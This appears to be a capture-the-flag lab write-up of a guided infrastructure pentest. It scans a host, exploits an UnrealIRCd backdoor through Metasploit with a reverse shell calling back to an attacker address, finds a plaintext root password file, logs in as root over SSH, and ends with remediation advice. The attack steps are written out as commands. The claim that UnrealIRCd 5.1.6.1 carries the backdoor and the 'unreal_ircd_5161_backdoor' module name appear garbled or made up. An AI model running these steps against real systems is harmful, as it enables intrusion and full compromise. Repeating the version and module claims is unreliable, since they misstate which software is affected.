# Guided Pentest: Infrastructure - Lab Notes & Writeup

# 1. Reconnaissance & Enumeration

The assessment followed a structured infrastructure methodology, starting with zero initial knowledge.

# Port & Service Scanning

Comprehensive TCP port scanning and service fingerprinting were executed using Nmap, saving the results for reporting:

    nmap -sV -sC -oN scan.txt MACHINE_IP

# Key Findings:

    Port 22/tcp (SSH): OpenSSH 9.6p1 (Ubuntu Linux).

    Port 8889/tcp (IRC): UnrealIRCd (Version: Unreal5.1.6.1, Host: irc.pentest-target.thm).

# Vulnerability Analysis & Exploit Research

Analyzing the Nmap scan results highlighted UnrealIRCd running on port 8889. Utilizing searchsploit to look for public disclosures revealed a critical remote code execution vulnerability:

    searchsploit unrealircd

Discovered Vector: UnrealIRCd 3.2.8.1 (and specific versions like 5.1.6.1) contained an officially disclosed backdoor introduced into the official archive, allowing unauthenticated remote command execution.

# 2. Exploitation

# Initial Access via Metasploit

To exploit the UnrealIRCd backdoor safely and efficiently, the Metasploit Framework was utilized.

    Launch Metasploit:
    
    msfconsole

    Select the Exploit Module:
    Bash

    search unrealircd
    use exploit/unix/irc/unreal_ircd_5161_backdoor

    Configure Exploit Options:
    Set the required target host parameter:
    Bash

    set RHOSTS MACHINE_IP

    Select and Configure Payload:
    Since the target operating specifics were broad, a generic Unix command reverse payload was chosen and configured with the listener details:
    Bash

    set payload cmd/unix/reverse
    set LHOST CONNECTION_IP
    set LPORT 443

Execute the Exploit:

    exploit

Result: A command shell session was successfully opened. Executing whoami confirmed execution under the low-privileged webmaster user context. The initial flag was retrieved from /home/webmaster/flag.txt.

# Local Enumeration & Privilege Escalation

Once inside the target, local post-exploitation enumeration was performed to identify paths to privilege escalation.

To find potential configuration or credential files across the filesystem while suppressing error output, the following command was executed:

    find / -name password* 2>/dev/null

Key Discovery: The search revealed an unusual configuration artifact at /etc/password.txt.

# Exploiting Plaintext Credentials

Inspecting the contents of /etc/password.txt via cat /etc/password.txt exposed the root user password stored in plaintext.

Because the initial reverse shell was a non-interactive "dumb" shell lacking a proper TTY (which prevents secure password prompts like su from functioning), the discovered credentials were leveraged against the exposed SSH service from an external terminal:

    ssh root@MACHINE_IP

Entering the plaintext password successfully authenticated the session as root, achieving full system compromise and allowing retrieval of the final flag from /root/flag.txt.

# 3. Remediation

| Vulnerability | Severity | Description & Impact |
| :--- | :--- | :--- |
| **UnrealIRCd Backdoor (RCE)** | Critical | An unauthenticated backdoor in the IRC service allowed remote command execution, granting an initial foothold as `webmaster`. |
| **Plaintext Credential Storage** | Critical | Root user credentials were saved in plaintext inside `/etc/password.txt` on the filesystem, enabling direct administrative escalation. |
| **Insecure File Permissions** | Medium | Sensitive system files containing administrative credentials were readable by low-privileged users. |

Patch & Update Services: Immediately update or patch UnrealIRCd to remove the vulnerable software version and eliminate backdoored packages.

Remove Plaintext Secrets: Delete /etc/password.txt from the filesystem immediately and rotate the root password.

Secure Credential Management: Never store credentials in plaintext on disk. Utilize native OS mechanisms like /etc/shadow protected by robust cryptographic hashing, or deploy an enterprise secrets management solution.

Enforce Least Privilege: Audit file system permissions to ensure low-privileged service accounts cannot access sensitive administrative files or configuration paths.
